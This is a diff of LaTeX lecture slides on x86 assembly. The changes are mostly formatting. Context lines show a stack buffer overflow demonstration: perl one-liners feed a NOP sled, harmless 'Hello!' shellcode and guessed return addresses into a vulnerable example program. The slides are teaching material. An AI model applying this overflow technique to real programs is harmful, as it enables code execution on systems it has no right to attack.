@@ -475,7 +475,7 @@ Disassembly of section .data:
         \item View CPU registers: {\ttfamily info reg}
         \item Disassemble next instruction: {\ttfamily x/i \$eip}
         \item View five dwords of memory starting at {\ttfamily \$esp}: {\ttfamily x/5w \$esp}
-        \item View five bytes of memory starting at {\ttfamily 0xbffffff0}: {\ttfamily x/5w 0xbffffff0}
+        \item View five bytes of memory starting at {\ttfamily 0xbffffff0}: {\ttfamily x/5b 0xbffffff0}
     \end{itemize}
 \end{itemize}
 \end{frame}
@@ -1511,7 +1511,7 @@ main:
     # printf(formatStr1, %eax, %eax);
     pushl %eax
     pushl %eax
-    pushl $formatStr1   # *Address* of formatStr1
+    pushl $formatStr1   # /Address/ of formatStr1
     call printf
     addl $12, %esp      # Clean up the stack
 
@@ -1531,7 +1531,7 @@ main:
 
     # printf(formatStr2, %eax);
     pushl %eax
-    pushl $formatStr2   # *Address* of formatStr2
+    pushl $formatStr2   # /Address/ of formatStr2
     call printf
     addl $8, %esp       # Clean up the stack
 
@@ -2725,7 +2725,7 @@ $ objdump -D example-18
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Stack Frame of get\_input()}
+\frametitle{Stack Frame of {\ttfamily get\_input()}}
 \mvs
 \begin{gascode*}{textsize=\textsize{8.5}{8}}
 # Function prologue
@@ -3036,20 +3036,26 @@ $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
  \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x80\xf2\xff\xbf"' | wc
       0       1     116
-
-Guess at the  return address, starting at 0xbffff280:
+\end{textcode*}
+\pause
+\begin{textcode*}{textsize=\textsize{8}{8}}
+Guess at the return address, starting at 0xbffff280:
 $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
  \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x80\xf2\xff\xbf"' | ./example-18
 input:
 Segmentation fault
-
+\end{textcode*}
+\pause
+\begin{textcode*}{textsize=\textsize{8}{8}}
 $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
  \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x70\xf2\xff\xbf"' | ./example-18
 input:
 Illegal instruction
-
+\end{textcode*}
+\pause
+\begin{textcode*}{textsize=\textsize{8}{8}}
 $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
  \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x60\xf2\xff\xbf"' | ./example-18
@@ -3286,10 +3292,12 @@ $
 \begin{itemize}
   \item Play with the examples
   \item Write your own syscall, e.g. rot13
-  \item Do Stack Smashing challenges: \\ \url{http://community.corest.com/~gera/InsecureProgramming/}
+  \item Do Stack Smashing challenges: \\ {\footnotesize \url{http://community.corest.com/~gera/InsecureProgramming/}}
   \item Rewrite a traditional *nix program in Assembly
-  \item e.g. telnet: \\ {\small \url{https://github.com/vsergeev/x86asm/blob/master/telnet.asm}}
-  \item e.g. asmscan: \\ {\small \url{https://github.com/edma2/asmscan}}
+\begin{itemize}
+  \item e.g. telnet: \\ {\footnotesize \url{https://github.com/vsergeev/x86asm/blob/master/telnet.asm}}
+  \item e.g. asmscan: \\ {\footnotesize\url{https://github.com/edma2/asmscan}}
+\end{itemize}
   \item Write assembly for microcontrollers like Atmel AVR and ARM
 \end{itemize}
 \end{frame}
